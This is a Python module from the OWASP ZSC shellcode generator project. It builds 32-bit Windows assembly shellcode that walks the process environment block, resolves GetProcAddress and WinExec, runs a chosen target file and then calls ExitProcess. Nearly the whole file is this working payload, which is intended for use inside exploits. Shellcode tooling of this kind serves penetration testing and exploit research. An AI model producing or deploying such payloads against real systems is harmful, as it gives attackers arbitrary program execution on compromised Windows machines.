
"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import base_module, stack, alert
from math import ceil


class Module(base_module.BasePayload):
    target_file = base_module.OptString("", "Target file to execute")

    def generate(self):
        payload = "xor %ecx, %ecx\n"
        payload += "mov %fs:0x30(%ecx), %eax\n"
        payload += "mov 0xc(%eax), %eax\n"
        payload += "mov 0x14(%eax), %esi\n"
        payload += "lods %ds:(%esi), %eax\n"
        payload += "xchg %eax, %esi\n"
        payload += "lods %ds:(%esi), %eax\n"
        payload += "mov 0x10(%eax), %ebx\n"
        payload += "mov 0x3c(%ebx), %edx\n"
        payload += "add %ebx, %edx\n"
        payload += "mov 0x78(%edx), %edx\n"
        payload += "add %ebx, %edx\n"
        payload += "mov 0x20(%edx), %esi\n"
        payload += "add %ebx, %esi\n"
        payload += "xor %ecx, %ecx\n"
        payload += "inc %ecx\n"
        payload += "lods %ds:(%esi), %eax\n"
        payload += "add %ebx, %eax\n"
        payload += "cmpl $0x50746547, (%eax)\n"
        payload += "jne 23 <.text+0x23>\n"
        payload += "cmpl $0x41636f72, 0x4(%eax)\n"
        payload += "jne 23 <.text+0x23>\n"
        payload += "cmpl $0x65726464, 0x8(%eax)\n"
        payload += "jne 23 <.text+0x23>\n"
        payload += "mov 0x24(%edx), %esi\n"
        payload += "add %ebx, %esi\n"
        payload += "mov (%esi, %ecx, 2), %cx\n"
        payload += "dec %ecx\n"
        payload += "mov 0x1c(%edx), %esi\n"
        payload += "add %ebx, %esi\n"
        payload += "mov (%esi, %ecx, 4), %edx\n"
        payload += "add %ebx, %edx\n"
        payload += "push %ebx\n"
        payload += "push %edx\n"
        payload += "xor %ecx, %ecx\n"
        payload += "push %ecx\n"
        payload += "mov $0x61636578, %ecx\n"
        payload += "push %ecx\n"
        payload += "subl $0x61, 0x3(%esp)\n"
        payload += "push $0x456e6957\n"
        payload += "push %esp\n"
        payload += "push %ebx\n"
        payload += "call *%edx\n"
        payload += "add $0x8, %esp\n"
        payload += "pop %ecx\n"
        payload += "push %eax\n"
        payload += "xor %ecx, %ecx\n"
        payload += "push %ecx\n"
        payload += stack.generate(self.target_file, "%ecx", "string")
        payload += "xor %ebx, %ebx\n"
        payload += "mov %esp, %ebx\n"
        payload += "xor %ecx, %ecx\n"
        payload += "inc %ecx\n"
        payload += "push %ecx\n"
        payload += "push %ebx\n"
        payload += "call *%eax\n"
        payload += f"add ${hex(int(8 + 4 * (ceil(len(self.target_file) / float(4)))))}, %esp\n"
        payload += "pop %edx\n"
        payload += "pop %ebx\n"
        payload += "xor %ecx, %ecx\n"
        payload += "mov $0x61737365, %ecx\n"
        payload += "push %ecx\n"
        payload += "subl $0x61, 0x3(%esp)\n"
        payload += "push $0x636f7250\n"
        payload += "push $0x74697845\n"
        payload += "push %esp\n"
        payload += "push %ebx\n"
        payload += "call *%edx\n"
        payload += "xor %ecx, %ecx\n"
        payload += "push %ecx\n"
        payload += "call *%eax\n"

        return payload

    def run(self):
        if not self.target_file:
            alert.error("Target file and file's permissions are required")
            return
        try:
            import traceback
            self.handle_generate(__name__)
        except:
            traceback.print_exc()
